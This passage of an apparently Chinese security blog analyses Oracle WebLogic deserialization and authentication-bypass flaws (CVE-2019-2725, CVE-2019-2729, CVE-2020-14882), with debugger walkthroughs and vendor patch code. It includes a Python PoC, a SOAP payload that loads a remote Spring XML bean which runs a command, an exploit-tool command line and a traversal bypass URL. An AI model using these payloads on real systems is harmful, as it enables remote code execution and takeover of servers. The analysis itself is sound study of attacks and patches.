(_index, exploit)</span><br><span class="line">    <span class="keyword">return</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    url += <span class="string">&#x27;/_async/AsyncResponseService&#x27;</span></span><br><span class="line">    data = gen_payload(cmd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] send payload&quot;</span>)</span><br><span class="line">        response = requests.post(url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">202</span>:</span><br><span class="line">          result = <span class="string">&quot;[+] test ok&quot;</span></span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          result = <span class="string">&quot;[*] No Vulnerability&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">          result = <span class="string">&#x27;[*] error: &#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python3 poc.py http://127.0.0.1:7001 touch /tmp/success&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">        cmd = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:])</span><br><span class="line">        <span class="built_in">print</span>(poc(ip, cmd))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>版本 2（通杀版本）</em></p>
<blockquote>
<p>这个payload执行的前提是支持spel表达式</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_async/AsyncResponseService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>849</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">string</span>&gt;</span>http://127.0.0.1:8000/poc.xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// poc.xml</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[calc]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>漏洞发生原因是<code>wls9_async_response.war</code>包中的类由于使用注解方法调用了Weblogic原生处理Web服务的类，这个漏洞可以说是对CVE-2017-10271的另一个入口和补丁绕过</p>
<p>首先我们的漏洞入口在<code>weblogic.wsee.async.AsyncResponseHandler</code>类的<code>handleRequest</code>方法上，设置RelatesTo属性进入else分支</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440e3e017f766fb6a66592c.png" alt="image-20210125225235703"></p>
<p>一直往下走就会来到<code>weblogic.wsee.server.servlet.SoapProcessor</code>的<code>process()</code>和<code>handlePost()</code>方法，而后会调用WsSkel的<code>invoke()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440d5d936b63cd9392dd39f.png" alt="image-20210126003209680"></p>
<p>跟进<code>invoke()</code>方法，实例化了ServerDispatcher对象，并调用了<code>dispatch()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714402eae817942a7069a06c6.png" alt="image-20210126003353598"></p>
<p>在<code>dispatch()</code>方法中，对<code>InternalHandlerList</code>进行<code>setHandlerChain()</code>操作，然后再调用<code>getHandlerChain().handleRequest()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441b32c4ed5ac5b74657213.png" alt="image-20210126003819404"></p>
<p><code>handleRequest()</code>方法根据handlers列表依次调用每个handler的<code>handleRequest()</code>，但只要某个handler的<code>handleRequest()</code>返回false则直接return，后面handler的<code>handleRequest()</code>将不会被调用</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714410b478e7ac4f3dda1e107.png" alt="image-20210126004609041"></p>
<p>handlers列表如下，其中有四个需要重点关注的handler，我们需要确保它们能够全部执行，即至少执行到第17个handler</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144100afeeea5b38f6634fda.png" alt="image-20210126005217365"></p>
<p>在<code>ServerAddressingHandler.handleRequest()</code>中，先关注<code>setWSAVersion()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144190acff0e93c16031c5b0.png" alt="image-20210126005628769"></p>
<p>其中<code>setWSAVersion()</code>中获取请求中Message的ActionHeader，根据ActionHeader中namespaceURI的不同进行不同的处理，而我们的目的是为了跳过<code>weblogic.wsee.addressing.version</code>的赋值，原因在下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441fa1e92c15c1c82618a24.png" alt="image-20210126005838925"></p>
<p>在<code>validateWSAVersion()</code>函数中，如果<code>weblogic.wsee.addressing.version</code>属性若为空，则设置为<code>WSAVersion.WSA10</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144232591d48de3c89bd8fae.png" alt="image-20210126010047616"></p>
<p>回到<code>handleRequest()</code>往下看，当版本号等于<code>WSAVersion.WSA10</code>时var24为true</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442b9f7b3b216175f920672.png" alt="image-20210126010718096"></p>
<p>继续往下看，判断MsgHeader中的ActionHeader、RelatesToHeader存在则对相应属性进行赋值，同时使var23、var28为true，而var23、var28跟var24直接影响是否抛出异常，如果抛出异常<code>handlers</code>将无法继续往下遍历</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714425c3eb9528db65e68e19d.png" alt="image-20210126010423073"></p>
<p>下面来到<code>AsyncResponseHandler的handleRequest()</code>，我们需要保证Message的<code>weblogic.wsee.addressing.RelatesTo</code>属性的值为非空，否则会返回false，将导致<code>handlers</code>无法继续往下遍历</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442078b286cbbb2273d9237.png" alt="image-20210126011018421"></p>
<p>接着来到<code>OperationLookupHandler</code>的<code>handleRequest()</code>，保证Message中的<code>OperationName</code>为非空，否则会抛出异常，令<code>handlers</code>无法继续往下遍历</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714421f820f16703317a92e86.png" alt="image-20210126011223780"></p>
<p>最后来到<code>WorkAreaServerHandler</code>的<code>handleRequest()</code>，把Header的WorkAreaHeader部分传入<code>WorkContextXmlInputAdapter()</code>进行实例化，然后调用<code>receiveRequest()</code>处理，后面的就和CVE-2017-10271的漏洞分析一样了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442a84d39b0bf88d93ec0f1.png" alt="image-20210126011330536"></p>
<p><strong>补丁</strong></p>
<p>增加了对class标签的限制和array中length的大小限制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">   <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="type">int</span> <span class="variable">overallarraylength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:object&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;class&quot;</span>)) &#123; <span class="comment">// new</span></span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:class&quot;</span>); </span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:new&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:method&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;void&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; attributes.getLength(); ++i) &#123;</span><br><span class="line">                     <span class="keyword">if</span> (!<span class="string">&quot;index&quot;</span>.equalsIgnoreCase(attributes.getQName(i))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid attribute for element void:&quot;</span> + attributes.getQName(i));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">                  <span class="type">String</span> <span class="variable">attClass</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span> (attClass != <span class="literal">null</span> &amp;&amp; !attClass.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="type">String</span> <span class="variable">lengthString</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;length&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span> (lengthString != <span class="literal">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> Integer.valueOf(lengthString);</span><br><span class="line">                        <span class="keyword">if</span> (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123; <span class="comment">// MAXARRAYLENGTH==10000</span></span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Exceed array length limitation&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="built_in">this</span>.overallarraylength += length;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Exceed over all array limitation.&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                     &#125; <span class="keyword">catch</span> (NumberFormatException var8) &#123;</span><br></pre></td></tr></table></figure>





<h4 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">https://github.com/ruthlezs/CVE-2019-2729-Exploit</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://127.0.0.1:7001 -c &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>该漏洞是对CVE-2019-2725的补丁绕过，在jdk7中解析xml时获取element元素的相关类为<code>com.sun.beans.decoder.DocumentHandler</code></p>
<p>因为在jdk7为array元素添加属性时，只能从length，class，id中选择，而唯一能创建类的class已经被加入了黑名单，所以jdk1.7版本不受此漏洞影响，这次的绕过主要针对低于1.7的jdk版本</p>
<p>而weblogic1036自带的jdk版本为1.6，jdk1.6中解析xml时有很大差异，相关处理方法在<code>com.sun.beans.ObjectHandler</code>，我们从<code>startElemen()</code>方法入手</p>
<p>在对标签进行解析时，会对其类、属性和方法进行检查，如果存在就对其进行设置，如果方法不存在，就会生成一个new方法，如果存入<code>forName</code>值的话，我们就可以引入任意类了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442f4b576f32f3d2cd492ab.png" alt="image-20210126170922028"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271443139fce816fdee93e2625.png" alt="image-20210126172345512"></p>
<p>所以绕过方法就是使用<code>&lt;array method=&quot;forName&quot;&gt;</code>来代替上面的<code>&lt;class&gt;</code>即可绕过黑名单</p>
<p><strong>补丁</strong></p>
<p>使用白名单进行修复</p>
<p>增加了一层<code>validateFormat</code>过滤，增加白名单限制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WorkContextFormatInfo</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Map&lt;String, String&gt;&gt; allowedName = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">WorkContextFormatInfo</span><span class="params">()</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		allowedName.put(<span class="string">&quot;string&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;int&quot;</span>, (Object)<span class="literal">null</span>) ;</span><br><span class="line">		allowedName.put(<span class="string">&quot;long&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		Map&lt;String, String&gt; allowedAttr = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;byte&quot;</span>);</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;length&quot;</span>, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;array&quot;</span>, allowedAttr);</span><br><span class="line">		allowedAttr = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;index&quot;</span>, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">		allowedNameput(<span class="string">&quot;void&quot;</span>, allowedAttr);</span><br><span class="line">		allowedNameput(<span class="string">&quot;byte&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;boolean&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;short&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;char&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;float&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;double&quot;</span>, (Object)<span class="literal">null</span>) ;</span><br><span class="line">		allowedAttr = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;java.beans.XMLDecoder&quot;</span>) ;</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;version&quot;</span>, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">		allowedName.put <span class="string">&quot;java&quot;</span>, allowedattr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="*CVE-2020-14882"></a>*CVE-2020-14882</h4><blockquote>
<p>Oracle WebLogic Server  10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>我们将入口点定义到WebLogic处理Servlet请求的函数当中</p>
<p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\internal\WebAppServletContext.class#execute</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160713802.png" alt="image-20211112160713802"></p>
<p>在判断完<code>url</code>非访问<code>/WEB-INF</code>或<code>/META-INF</code>文件时就会执行就下面的<code>securedExecute()</code>函数继续解析</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160956483.png" alt="image-20211112160956483"></p>
<p>持续根据就会来到<code>doSecuredExecute()</code>函数，这里的<code>checkAccess()</code>函数会用户进行鉴权操作</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112170050066.png" alt="image-20211112170050066"></p>
<p>如果我们想要绕过下面的认证就需令这个<code>resourceConstraint</code>变量不为空</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112170102720.png" alt="image-20211112170102720"></p>
<p><code>getConstraint()</code>函数是用来判断当前<code>url</code>是否在请求静态资源，如果是的话就会放回对应的静态资源列表，其中具体实现如下</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112171248252.png" alt="image-20211112171248252"></p>
<p>因为这里的<code>this.constraintsMap</code>字典只有一个<code>&quot;&quot;</code>的键值，所以<code>consForAllMethods</code>包含了所有了静态资源列表（列表如下），而<code>consForOneMethod</code>为空，而我们的<code>relURI</code>为<code>/css/%2e%2e%2fconsole.portal</code>，所以<code>rcForAllMethods</code>匹配到了<code>/css/</code>路径，而<code>rcForOneMethod</code>本来就是空，所以根据程序逻辑，我们返回的是不为空的<code>rcForAllMethods</code>变量，从而绕过了认证操作</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112171402107.png" alt="image-20211112171402107" style="zoom:67%;" />

<p>接下来调用<code>isAuthorized()</code>函数来判断用户是否认证</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112172240027.png" alt="image-20211112172240027"></p>
<p><code>isAuthorized()</code>函数内部又调用了<code>checkAccess()</code>来验证用户身份</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112174107658.png" alt="image-20211112174107658"></p>
<p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\security\internal\ChainedSecurityModule.class#checkAccess</code></p>
<p>然后一直跟进到<code>checkUserPerm()</code>函数检查用户权限</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112174522850.png" alt="image-20211112174522850"></p>
<p>一直跟进到<code>hasPermission()</code>函数判断用户是否有访问权限</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112221058420.png" alt="image-20211112221058420"></p>
<p>虽然我们没有<code>AdminMode</code>，但是我们的资源列表<code>/css/*</code>是无需授权的，所以我们的<code>hasPermission()</code>返回的是<code>true</code>，一路跟下来之后<code>checkAccess()</code>函数返回的也是<code>true</code>，最终我们的<code>authorized</code>变量仍旧为<code>true</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112221257191.png" alt="image-20211112221257191"></p>
<p>之后便是跟进到WebLogic从<code>web.xml</code>中的匹配模式找到对应的<code>Servlet</code>来对请求进行处理</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112172827956.png" alt="image-20211112172827956"></p>
<p>首先我们的<code>*.portal</code>模式对应的<code>servlet-name</code>为<code>AppManagerServlet</code></p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173625448.png" alt="image-20211112173625448" style="zoom:80%;" />

<p><code>AppManagerServlet</code>对应的<code>servlet-class</code>为<code>weblogic.servlet.AsyncInitServlet</code></p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173711206.png" alt="image-20211112173711206" style="zoom:80%;" />

<p>根据<code>StubSecurityHelper</code>类的逻辑我们会调用到对应<code>servlet</code>的<code>service()</code>方法</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225039009.png" alt="image-20211112225039009"></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225010994.png" alt="image-20211112225010994"></p>
<p>在<code>service()</code>函数里，只要<code>url</code>不包含<code>;</code>字符就会调用父类的<code>service()</code>方法</p>
